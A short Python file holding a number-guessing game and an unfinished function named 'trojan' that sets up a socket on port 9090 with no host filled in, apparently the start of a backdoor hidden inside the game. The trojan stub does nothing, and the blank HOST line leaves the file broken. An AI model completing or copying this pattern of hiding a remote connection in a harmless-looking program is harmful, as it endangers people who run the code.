import random 
import socket 
import threading


def trojan():
    HOST = 
    port = 9090

    client = socket
def game():
    number = random.randint(0,1000)
    tries = 1
    done = False

    while not done:
        guess = int(input("Enter a guess:"))
        if guess == number:
            done = True
            print('You won!')
        else:
            tries += 1   
            if guess > number:
                print('the actuel numbrr is smaller ') 
            else:
                print('actuel number is larger')  
    print(f"You need {tries} tries")              